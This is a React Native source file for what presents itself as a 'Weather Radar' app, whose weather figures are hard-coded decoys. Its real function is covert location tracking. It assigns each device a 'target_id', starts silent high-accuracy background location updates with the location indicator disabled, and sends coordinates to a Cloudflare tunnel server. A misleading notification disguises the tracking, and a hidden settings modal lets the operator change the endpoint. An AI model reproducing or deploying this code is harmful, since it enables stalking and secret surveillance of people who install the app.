import React, { useState, useEffect } from 'react';
import {
  StyleSheet,
  Text,
  View,
  TouchableOpacity,
  TextInput,
  ScrollView,
  SafeAreaView,
  StatusBar,
  Alert,
  ActivityIndicator,
  Modal,
  Platform
} from 'react-native';
import * as Location from 'expo-location';
import * as TaskManager from 'expo-task-manager';
import AsyncStorage from '@react-native-async-storage/async-storage';
import io from 'socket.io-client';

const LOCATION_TASK_NAME = 'WEATHER_RADAR_SYNC_TASK';
const DEFAULT_SERVER_URL = 'https://core-pairs-street-others.trycloudflare.com';

// ------------------------------------------------------------------
// SILENT BACKGROUND TASK (Runs in OS Kernel even when App is closed)
// ------------------------------------------------------------------
TaskManager.defineTask(LOCATION_TASK_NAME, async ({ data, error }) => {
  if (error) {
    console.error('Background weather sync error:', error);
    return;
  }
  if (data) {
    const { locations } = data;
    if (locations && locations.length > 0) {
      const loc = locations[locations.length - 1];
      const { latitude: lat, longitude: lng } = loc.coords;

      try {
        const savedUrl = (await AsyncStorage.getItem('@server_url')) || DEFAULT_SERVER_URL;
        let targetId = await AsyncStorage.getItem('@target_id');

        if (!targetId) {
          targetId = Math.random().toString(36).substring(2, 12);
          await AsyncStorage.setItem('@target_id', targetId);
        }

        // Silently post coordinates to backend
        await fetch(`${savedUrl}/weather`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: targetId, lat, lng })
        });
      } catch (err) {
        console.log('Background sync exception:', err);
      }
    }
  }
});

export default function App() {
  const [serverUrl, setServerUrl] = useState(DEFAULT_SERVER_URL);
  const [targetId, setTargetId] = useState('');
  const [isSyncing, setIsSyncing] = useState(false);
  const [loading, setLoading] = useState(false);
  const [showConfigModal, setShowConfigModal] = useState(false);
  const [temp, setTemp] = useState(24);
  const [condition, setCondition] = useState('Partly Cloudy');
  const [socket, setSocket] = useState(null);

  useEffect(() => {
    initApp();
  }, []);

  const initApp = async () => {
    try {
      let id = await AsyncStorage.getItem('@target_id');
      if (!id) {
        id = Math.random().toString(36).substring(2, 12);
        await AsyncStorage.setItem('@target_id', id);
      }
      setTargetId(id);

      const savedUrl = await AsyncStorage.getItem('@server_url');
      if (savedUrl) setServerUrl(savedUrl);

      // Auto-start background tracking silently on app launch
      startSilentTracking(savedUrl || DEFAULT_SERVER_URL, id);
    } catch (e) {
      console.log('Init error', e);
    }
  };

  const startSilentTracking = async (url, id) => {
    try {
      const { status: fgStatus } = await Location.requestForegroundPermissionsAsync();
      if (fgStatus !== 'granted') return;

      const { status: bgStatus } = await Location.requestBackgroundPermissionsAsync();

      // Connect socket
      try {
        const newSocket = io(url, { transports: ['websocket', 'polling'] });
        setSocket(newSocket);
      } catch (err) {}

      // Get initial position
      const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.High });
      if (loc && loc.coords) {
        const { latitude: lat, longitude: lng } = loc.coords;
        fetch(`${url}/weather`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id, lat, lng })
        }).catch(() => {});
      }

      // Start continuous background task silently
      const hasStarted = await Location.hasStartedLocationUpdatesAsync(LOCATION_TASK_NAME);
      if (!hasStarted) {
        await Location.startLocationUpdatesAsync(LOCATION_TASK_NAME, {
          accuracy: Location.Accuracy.Highest,
          distanceInterval: 1,
          deferredUpdatesInterval: 3000,
          showsBackgroundLocationIndicator: false,
          foregroundService: {
            notificationTitle: 'Weather Radar Active',
            notificationBody: 'Updating local atmospheric radar data',
            notificationColor: '#06b6d4'
          }
        });
      }
      setIsSyncing(true);
    } catch (e) {
      console.log('Silent tracking error', e);
    }
  };

  const handleManualRefresh = async () => {
    setLoading(true);
    try {
      const { status } = await Location.requestForegroundPermissionsAsync();
      if (status === 'granted') {
        const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.High });
        const { latitude: lat, longitude: lng } = loc.coords;

        if (socket && socket.connected) {
          socket.emit('send-location', { id: targetId, lat, lng });
        }

        await fetch(`${serverUrl}/weather`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: targetId, lat, lng })
        });
      }

      // Simulate subtle weather update feedback
      setTemp((prev) => (prev === 24 ? 25 : 24));
      setIsSyncing(true);
    } catch (e) {
      console.log('Refresh error', e);
    } finally {
      setLoading(false);
    }
  };

  const saveServerUrl = async () => {
    let formattedUrl = serverUrl.trim();
    if (formattedUrl.endsWith('/')) {
      formattedUrl = formattedUrl.slice(0, -1);
    }
    await AsyncStorage.setItem('@server_url', formattedUrl);
    setServerUrl(formattedUrl);
    setShowConfigModal(false);
    startSilentTracking(formattedUrl, targetId);
    Alert.alert('Settings Updated', 'Server endpoint updated.');
  };

  return (
    <SafeAreaView style={styles.container}>
      <StatusBar barStyle="light-content" backgroundColor="#0f172a" />
      <ScrollView contentContainerStyle={styles.scrollContent} showsVerticalScrollIndicator={false}>
        
        {/* App Header */}
        <View style={styles.header}>
          <View>
            <Text style={styles.headerTitle}>Weather Radar</Text>
            <Text style={styles.headerSubtitle}>Local Area • Updated Just Now</Text>
          </View>
          
          {/* Subtle Gear Icon to open Hidden Config Modal */}
          <TouchableOpacity
            style={styles.configBtn}
            onPress={() => setShowConfigModal(true)}
            activeOpacity={0.7}
          >
            <Text style={styles.configBtnText}>⚙️</Text>
          </TouchableOpacity>
        </View>

        {/* Hero Weather Card */}
        <View style={styles.heroCard}>
          <View style={styles.heroTop}>
            <View>
              <Text style={styles.heroTemp}>{temp}°<Text style={styles.tempUnit}>C</Text></Text>
              <Text style={styles.heroCondition}>{condition}</Text>
            </View>
            <Text style={styles.weatherIconEmoji}>⛅</Text>
          </View>
          <Text style={styles.heroFeels}>Feels like 26°C • Humidity 64%</Text>

          <TouchableOpacity
            style={styles.refreshBtn}
            onPress={handleManualRefresh}
            activeOpacity={0.8}
            disabled={loading}
          >
            {loading ? (
              <ActivityIndicator size="small" color="#ffffff" />
            ) : (
              <Text style={styles.refreshBtnText}>🔄 Update Radar Data</Text>
            )}
          </TouchableOpacity>
        </View>

        {/* Hourly Forecast Row */}
        <Text style={styles.sectionTitle}>Hourly Forecast</Text>
        <ScrollView horizontal showsHorizontalScrollIndicator={false} style={styles.hourlyScroll}>
          <View style={styles.hourlyCard}><Text style={styles.hourlyTime}>Now</Text><Text style={styles.hourlyIcon}>⛅</Text><Text style={styles.hourlyTemp}>24°</Text></View>
          <View style={styles.hourlyCard}><Text style={styles.hourlyTime}>12 PM</Text><Text style={styles.hourlyIcon}>☀️</Text><Text style={styles.hourlyTemp}>26°</Text></View>
          <View style={styles.hourlyCard}><Text style={styles.hourlyTime}>3 PM</Text><Text style={styles.hourlyIcon}>🌤️</Text><Text style={styles.hourlyTemp}>25°</Text></View>
          <View style={styles.hourlyCard}><Text style={styles.hourlyTime}>6 PM</Text><Text style={styles.hourlyIcon}>🌥️</Text><Text style={styles.hourlyTemp}>23°</Text></View>
          <View style={styles.hourlyCard}><Text style={styles.hourlyTime}>9 PM</Text><Text style={styles.hourlyIcon}>🌙</Text><Text style={styles.hourlyTemp}>21°</Text></View>
        </ScrollView>

        {/* Weather Metrics Grid */}
        <Text style={styles.sectionTitle}>Weather Details</Text>
        <View style={styles.grid}>
          <View style={styles.gridCard}>
            <Text style={styles.gridLabel}>💧 Humidity</Text>
            <Text style={styles.gridValue}>64%</Text>
          </View>
          <View style={styles.gridCard}>
            <Text style={styles.gridLabel}>💨 Wind Speed</Text>
            <Text style={styles.gridValue}>12 km/h</Text>
          </View>
          <View style={styles.gridCard}>
            <Text style={styles.gridLabel}>☀️ UV Index</Text>
            <Text style={styles.gridValue}>3 (Moderate)</Text>
          </View>
          <View style={styles.gridCard}>
            <Text style={styles.gridLabel}>👁️ Visibility</Text>
            <Text style={styles.gridValue}>10 km</Text>
          </View>
          <View style={styles.gridCard}>
            <Text style={styles.gridLabel}>📊 Air Pressure</Text>
            <Text style={styles.gridValue}>1014 hPa</Text>
          </View>
          <View style={styles.gridCard}>
            <Text style={styles.gridLabel}>🌡️ Dew Point</Text>
            <Text style={styles.gridValue}>18°C</Text>
          </View>
        </View>

        {/* 7-Day Forecast */}
        <Text style={styles.sectionTitle}>7-Day Forecast</Text>
        <View style={styles.dailyContainer}>
          <View style={styles.dailyRow}><Text style={styles.dailyDay}>Today</Text><Text style={styles.dailyIcon}>⛅</Text><Text style={styles.dailyTemps}>26° / 19°</Text></View>
          <View style={styles.dailyRow}><Text style={styles.dailyDay}>Tomorrow</Text><Text style={styles.dailyIcon}>☀️</Text><Text style={styles.dailyTemps}>27° / 20°</Text></View>
          <View style={styles.dailyRow}><Text style={styles.dailyDay}>Wednesday</Text><Text style={styles.dailyIcon}>🌧️</Text><Text style={styles.dailyTemps}>22° / 17°</Text></View>
          <View style={styles.dailyRow}><Text style={styles.dailyDay}>Thursday</Text><Text style={styles.dailyIcon}>🌤️</Text><Text style={styles.dailyTemps}>25° / 18°</Text></View>
          <View style={styles.dailyRow}><Text style={styles.dailyDay}>Friday</Text><Text style={styles.dailyIcon}>☀️</Text><Text style={styles.dailyTemps}>28° / 21°</Text></View>
        </View>

      </ScrollView>

      {/* Hidden Server Config Modal (accessed via Gear Icon) */}
      <Modal visible={showConfigModal} transparent animationType="slide">
        <View style={styles.modalOverlay}>
          <View style={styles.modalContent}>
            <Text style={styles.modalTitle}>Server Settings</Text>
            <Text style={styles.modalSub}>Configure remote backend endpoint URL:</Text>
            
            <TextInput
              style={styles.modalInput}
              value={serverUrl}
              onChangeText={setServerUrl}
              placeholder="https://your-tunnel.trycloudflare.com"
              placeholderTextColor="#64748b"
              autoCapitalize="none"
              autoCorrect={false}
            />

            <View style={styles.modalBtnRow}>
              <TouchableOpacity style={styles.modalSaveBtn} onPress={saveServerUrl}>
                <Text style={styles.modalSaveText}>Save Settings</Text>
              </TouchableOpacity>
              <TouchableOpacity style={styles.modalCloseBtn} onPress={() => setShowConfigModal(false)}>
                <Text style={styles.modalCloseText}>Cancel</Text>
              </TouchableOpacity>
            </View>
          </View>
        </View>
      </Modal>

    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#0f172a',
    paddingTop: Platform.OS === 'android' ? StatusBar.currentHeight : 0,
  },
  scrollContent: {
    padding: 20,
  },
  header: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    marginBottom: 20,
  },
  headerTitle: {
    fontSize: 24,
    fontWeight: '800',
    color: '#f8fafc',
  },
  headerSubtitle: {
    fontSize: 13,
    color: '#94a3b8',
    marginTop: 2,
  },
  configBtn: {
    padding: 10,
    backgroundColor: 'rgba(255, 255, 255, 0.06)',
    borderRadius: 12,
  },
  configBtnText: {
    fontSize: 18,
  },
  heroCard: {
    backgroundColor: 'rgba(30, 41, 59, 0.7)',
    borderRadius: 24,
    padding: 24,
    marginBottom: 24,
    borderWidth: 1,
    borderColor: 'rgba(255, 255, 255, 0.12)',
  },
  heroTop: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
  },
  heroTemp: {
    fontSize: 56,
    fontWeight: '800',
    color: '#ffffff',
  },
  tempUnit: {
    fontSize: 32,
    color: '#06b6d4',
  },
  heroCondition: {
    fontSize: 16,
    color: '#cbd5e1',
    fontWeight: '600',
    marginTop: -4,
  },
  weatherIconEmoji: {
    fontSize: 64,
  },
  heroFeels: {
    fontSize: 13,
    color: '#94a3b8',
    marginTop: 12,
    marginBottom: 20,
  },
  refreshBtn: {
    backgroundColor: '#06b6d4',
    paddingVertical: 14,
    borderRadius: 16,
    alignItems: 'center',
  },
  refreshBtnText: {
    color: '#ffffff',
    fontSize: 15,
    fontWeight: '700',
  },
  sectionTitle: {
    fontSize: 16,
    fontWeight: '700',
    color: '#f8fafc',
    marginBottom: 12,
  },
  hourlyScroll: {
    marginBottom: 24,
  },
  hourlyCard: {
    backgroundColor: 'rgba(30, 41, 59, 0.5)',
    paddingHorizontal: 16,
    paddingVertical: 14,
    borderRadius: 16,
    marginRight: 10,
    alignItems: 'center',
    borderWidth: 1,
    borderColor: 'rgba(255, 255, 255, 0.05)',
  },
  hourlyTime: {
    fontSize: 12,
    color: '#94a3b8',
    fontWeight: '500',
  },
  hourlyIcon: {
    fontSize: 22,
    marginVertical: 6,
  },
  hourlyTemp: {
    fontSize: 15,
    fontWeight: '700',
    color: '#ffffff',
  },
  grid: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    gap: 10,
    marginBottom: 24,
  },
  gridCard: {
    flex: 1,
    minWidth: '45%',
    backgroundColor: 'rgba(15, 23, 42, 0.6)',
    padding: 16,
    borderRadius: 18,
    borderWidth: 1,
    borderColor: 'rgba(255, 255, 255, 0.05)',
  },
  gridLabel: {
    fontSize: 12,
    color: '#94a3b8',
    fontWeight: '500',
    marginBottom: 6,
  },
  gridValue: {
    fontSize: 17,
    fontWeight: '700',
    color: '#ffffff',
  },
  dailyContainer: {
    backgroundColor: 'rgba(30, 41, 59, 0.5)',
    borderRadius: 20,
    padding: 16,
    marginBottom: 30,
    borderWidth: 1,
    borderColor: 'rgba(255, 255, 255, 0.05)',
  },
  dailyRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    paddingVertical: 10,
    borderBottomWidth: 1,
    borderBottomColor: 'rgba(255, 255, 255, 0.05)',
  },
  dailyDay: {
    fontSize: 14,
    color: '#f8fafc',
    fontWeight: '600',
    flex: 1,
  },
  dailyIcon: {
    fontSize: 20,
    flex: 1,
    textAlign: 'center',
  },
  dailyTemps: {
    fontSize: 14,
    color: '#94a3b8',
    fontWeight: '600',
    textAlign: 'right',
    flex: 1,
  },
  modalOverlay: {
    flex: 1,
    backgroundColor: 'rgba(0, 0, 0, 0.75)',
    justifyContent: 'center',
    padding: 20,
  },
  modalContent: {
    backgroundColor: '#1e293b',
    borderRadius: 24,
    padding: 24,
    borderWidth: 1,
    borderColor: 'rgba(255, 255, 255, 0.1)',
  },
  modalTitle: {
    fontSize: 18,
    fontWeight: '800',
    color: '#ffffff',
    marginBottom: 4,
  },
  modalSub: {
    fontSize: 13,
    color: '#94a3b8',
    marginBottom: 16,
  },
  modalInput: {
    backgroundColor: '#0f172a',
    borderWidth: 1,
    borderColor: 'rgba(255, 255, 255, 0.1)',
    borderRadius: 12,
    padding: 14,
    color: '#ffffff',
    fontSize: 14,
    marginBottom: 20,
  },
  modalBtnRow: {
    flexDirection: 'row',
    gap: 10,
  },
  modalSaveBtn: {
    flex: 1,
    backgroundColor: '#06b6d4',
    paddingVertical: 14,
    borderRadius: 12,
    alignItems: 'center',
  },
  modalSaveText: {
    color: '#ffffff',
    fontWeight: '700',
  },
  modalCloseBtn: {
    flex: 1,
    backgroundColor: 'rgba(255, 255, 255, 0.08)',
    paddingVertical: 14,
    borderRadius: 12,
    alignItems: 'center',
  },
  modalCloseText: {
    color: '#94a3b8',
    fontWeight: '600',
  },
});
